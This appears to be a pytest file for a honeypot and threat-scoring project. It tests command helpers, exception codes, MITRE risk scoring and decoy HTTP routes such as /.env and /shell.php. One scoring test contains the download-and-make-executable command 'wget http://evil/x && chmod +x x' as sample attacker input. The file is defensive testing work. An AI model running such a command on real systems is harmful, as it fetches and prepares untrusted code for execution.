"""Cover command helpers, exception classes, MITRE scoring, and HTTP honeypot routes."""

from __future__ import annotations

import asyncio

import httpx
import pytest

from cloudsentinel import exceptions
from cloudsentinel.commands import Command, CommandAdapter
from cloudsentinel.http_server import create_http_honeypot
from cloudsentinel.mitre import score_auth_event, score_event


class FakeProtocol:
    def __init__(self) -> None:
        self.stdout: list[bytes] = []
        self.stderr: list[bytes] = []
        self.raw: list[bytes] = []
        self.environ = {"HOME": "/root"}

    def write_stdout(self, data: bytes) -> None:
        self.stdout.append(data)

    def write_stderr(self, data: bytes) -> None:
        self.stderr.append(data)

    def write(self, data: bytes) -> None:
        self.raw.append(data)


def test_command_helpers() -> None:
    protocol = FakeProtocol()
    command = Command(protocol, "one", "two")
    command.write("out")
    command.writeBytes(b"raw")
    command.errorWrite("err")
    command.start()
    command.handle_CTRL_C()
    assert repr(command) == "<Command>"
    assert protocol.stdout
    assert protocol.stderr
    assert protocol.raw

    adapter = CommandAdapter()
    adapter.write("a")
    adapter.write(b"b")
    adapter.write_stdout("c")
    adapter.write_stderr("d")
    assert adapter.flush() == "abcd"
    assert adapter.flush() == ""


def test_exception_classes() -> None:
    errors = [
        exceptions.ConnectionRejectedError("8.8.8.8", "limit"),
        exceptions.SessionLimitExceededError(10, 5),
        exceptions.FuzzDetectedError("8.8.8.8", "junk"),
        exceptions.AuthLimitExceededError("8.8.8.8", 6),
        exceptions.SessionTimeoutError("session-123456", 30),
        exceptions.ProtocolViolationError("8.8.8.8", "bad"),
        exceptions.BlockFailedError("8.8.8.8", "denied"),
        exceptions.BlockTimeoutError("8.8.8.8"),
        exceptions.RedisUnavailableError("down"),
        exceptions.AllowlistBlockError("10.0.0.1"),
        exceptions.ClickHouseWriteError(10, "fail"),
        exceptions.WALCorruptionError("wal"),
        exceptions.KafkaPublishError("topic", "fail"),
        exceptions.NATSPublishError("subject", "fail"),
        exceptions.ConfigError("field", "bad"),
        exceptions.MissingSecretError("secret"),
        exceptions.HASSHParseError("bad"),
        exceptions.SandboxTimeoutError("id", 1.5),
        exceptions.SandboxOOMError("128m"),
    ]
    assert all(error.code.startswith("CS") for error in errors)
    assert str(exceptions.CloudSentinelError("x", code="CS999")).startswith("[CS999]")


def test_mitre_scoring() -> None:
    assert score_auth_event("root", 3, "password")["risk_score"] > 0
    assert score_auth_event("admin", 1, "unique-password")["risk_score"] >= 0
    assert score_event(
        "cloudsentinel.login.failed",
        {"username": "root", "attempt": "bad", "password": "root"},
    )["risk_score"] > 0
    assert score_event(
        "cloudsentinel.login.success",
        {"username": "root", "attempt": 1, "password": "x"},
    )["risk_score"] >= 0
    assert score_event(
        "cloudsentinel.command.input",
        {"input": "wget http://evil/x && chmod +x x"},
    )["risk_score"] > 0
    assert score_event("cloudsentinel.honeytoken.access", {})["risk_score"] == 85
    assert score_event("unknown", {})["risk_score"] == 0


@pytest.mark.asyncio
async def test_http_honeypot_routes() -> None:
    class FakePipeline:
        def __init__(self) -> None:
            self.events: list = []

        async def emit(self, envelope: object) -> None:
            self.events.append(envelope)

    class FakeSoar:
        async def process_event(self, _session: str, _event: dict) -> dict:
            return {
                "cloudsentinel_soar_action": "blocked",
                "cloudsentinel_risk_score": 80,
            }

    pipeline = FakePipeline()
    app = create_http_honeypot(pipeline, FakeSoar())
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        assert (await client.get("/wp-login.php")).status_code == 200
        assert (await client.get("/manager/html")).status_code == 401
        assert (await client.get("/phpmyadmin")).status_code == 200
        assert (await client.get("/.env")).status_code == 200
        assert (await client.get("/missing")).status_code == 404
        await client.post("/admin")
        await client.post("/shell.php")
        await client.post("/wp-admin")
    await asyncio.sleep(0)
    assert pipeline.events

    class BrokenSoar:
        async def process_event(self, _session: str, _event: dict) -> dict:
            raise RuntimeError("soar down")

    broken_app = create_http_honeypot(FakePipeline(), BrokenSoar())
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=broken_app),
        base_url="http://test",
    ) as client:
        assert (await client.get("/missing")).status_code == 404
